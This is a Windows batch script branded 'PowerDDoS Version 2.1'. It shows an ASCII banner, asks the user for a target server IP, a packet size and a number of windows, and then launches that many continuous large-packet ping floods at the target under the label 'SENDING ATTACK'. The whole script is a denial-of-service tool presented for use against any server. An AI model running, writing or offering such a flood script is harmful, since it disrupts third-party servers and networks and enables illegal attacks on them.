@echo off
mode 117,28
title   .                                                                                                                      +  PowerDDoS By Chl6rine  +                                                                                              .
cls
color f
echo.
set hrs=%time:~0,2%
set mns=%time:~3,2%
set scs=%time:~6,2%
set mls=%time:~9,2%
set nmt=%time:~0,8%
echo.

Call :Color 04 "               dBBBBBb  dBBBBP dBPdBPdBP dBBBP dBBBBBb    dBBBBb  dBBBBb  dBBBBP.dBBBBP  "
echo.
Call :Color 04 "                   dB' dBP.BP                      dBP       dB'     dB' dB'.BP BP       "
echo.
Call :Color 04 "               dBBBP' dBP.BP dBP   PdBP dBBP    dBBBBK   dBP dB' dBP dB' dB'.BP  `BBBBb    "
echo.
Call :Color 0c "              dBP    dBP.BP dBPdB dBP dBP     dBP  BB  dBP dB' dBP dB' dB'.BP      dBP   "
echo.
Call :Color 0c "             dBP    dBBBBP dBBBBBBBP dBBBBP  dBP  dB' dBBBBB' dBBBBB' dBBBBP  dBBBBP'   "
echo.
echo.
echo.
Call :Color 0e "                                     PowerDDoS Version 2.1"
echo.
echo.
goto main
:Color

SetLocal EnableExtensions EnableDelayedExpansion
Set "Text=%~2"
If Not Defined Text (Set Text=^")
Subst `: "!Temp!" >Nul &`: &Cd \
If Not Exist `.7 (
Echo(|(Pause >Nul &Findstr "^" >`)
Set /P "=." >>` <Nul
For /F "delims=;" %%# In (
'"Prompt $H;&For %%_ In (_) Do Rem"') Do (
Set /P "=%%#%%#%%#" <Nul >`.3
Set /P "=%%#%%#%%#%%#%%#" <Nul >`.5
Set /P "=%%#%%#%%#%%#%%#%%#%%#" <Nul >`.7))
Set /P "LF=" <` &Set "LF=!LF:~0,1!"
For %%# in ("!LF!") Do For %%_ In (
\ / :) Do Set "Text=!Text:%%_=%%~#%%_%%~#!"
For /F delims^=^ eol^= %%# in ("!Text!") Do (
If #==#! SetLocal DisableDelayedExpansion
If \==%%# (Findstr /A:%~1 . \` Nul
Type `.3) Else If /==%%# (Findstr /A:%~1 . /.\` Nul
Type `.5) Else (Echo %%#\..\`>`.dat
Findstr /F:`.dat /A:%~1 .
Type `.7))
If "\n"=="%~3" (Echo()
Goto :Eof

:main
Call :Color 0a "  <> Server IP: <> "
echo.
set /p ip=[%hrs%:%mns%:%scs%] ^> 
Call :Color 0a "   <> PACKETS: (Recommended 1200 or lower) <>"
echo.
set /p packets=[%hrs%:%mns%:%scs%] ^> 
Call :Color 0a  "   <> Number of DDoS Windows open you want <>"
echo.
set /p windowsOpen=[%hrs%:%mns%:%scs%] 
Call :Color 04  "  - SENDING ATTACK -" 


ping localhost -n 3 >nul
@echo off
for /L %%a in (1,1,%windowsOpen%) do (

start ping %ip% -t -l %packets% 

)






